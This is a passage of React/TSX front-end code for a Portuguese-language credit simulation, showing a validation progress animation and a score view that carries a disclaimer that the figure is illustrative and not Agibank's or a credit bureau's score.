            cy="50"
            r="42"
            fill="none"
            strokeWidth="6"
            className="stroke-primary-soft"
          />
          <circle
            cx="50"
            cy="50"
            r="42"
            fill="none"
            strokeWidth="6"
            strokeDasharray="264"
            strokeDashoffset={264 - (264 * progress) / 100}
            strokeLinecap="round"
            className="stroke-primary transition-all duration-300 ease-out"
          />
        </svg>
        <img
          src={symbolAsset.url}
          alt=""
          width={36}
          height={36}
          className="absolute inset-0 m-auto size-9 object-contain"
        />
      </div>

      <div className="mt-4">
        <span className="inline-block rounded-full bg-primary-soft px-3 py-1 text-xs font-bold text-primary">
          {progress}% concluído
        </span>
      </div>

      <h2 className="mt-3 text-xl font-semibold tracking-tight">{title}</h2>
      <p className="mt-1 text-xs text-muted-foreground">
        Aguarde alguns instantes enquanto validamos suas informações com segurança.
      </p>

      <ul className="mx-auto mt-6 max-w-xs space-y-3 text-left text-sm">
        {lines.map((l, j) => {
          const isDone = j < i;
          const isCurrent = j === i;
          return (
            <li
              key={l}
              className={`flex items-center gap-3 transition-opacity duration-500 ${
                j <= i ? "opacity-100" : "opacity-35"
              }`}
            >
              {isDone ? (
                <CheckCircle2 className="size-4 shrink-0 text-success" />
              ) : isCurrent ? (
                <Loader2 className="size-4 shrink-0 animate-spin text-primary" />
              ) : (
                <div className="size-4 shrink-0 rounded-full border-2 border-muted-foreground/30" />
              )}
              <span className={isCurrent ? "font-medium text-foreground" : ""}>
                {l}
              </span>
            </li>
          );
        })}
      </ul>
    </section>
  );
}

function ScoreView({ score, range, onNext }: { score: number; range: string; onNext: () => void }) {
  return (
    <Card icon={<TrendingUp />} title="Seu perfil na simulação" subtitle="Indicador ilustrativo, não é o score do Agibank ou de um birô de crédito.">
      <ScoreGauge score={score} />
      <div className="text-center"><span className="text-sm font-semibold text-primary">{scoreLabel(score)}</span></div>
      <dl className="divide-y border-y text-sm">
        {[["CPF", "Dígitos válidos · identidade pendente"], ["Renda declarada", range], ["Análise bancária", "Não realizada"], ["Aprovação", "Depende de análise autorizada"]].map(([label, value]) => (
          <div key={label} className="grid grid-cols-[minmax(0,1fr)_minmax(0,1.3fr)] gap-3 py-3"><dt className="text-muted-foreground">{label}</dt><dd className="min-w-0 break-words text-right font-semibold">{value}</dd></div>
        ))}
      </dl>
      <Button variant="hero" size="xl" className="h-auto min-h-14 w-full whitespace-normal px-4 py-3" onClick={onNext}>Ver valor estimado <ArrowRight /></Button>
    </Card>
  );
}
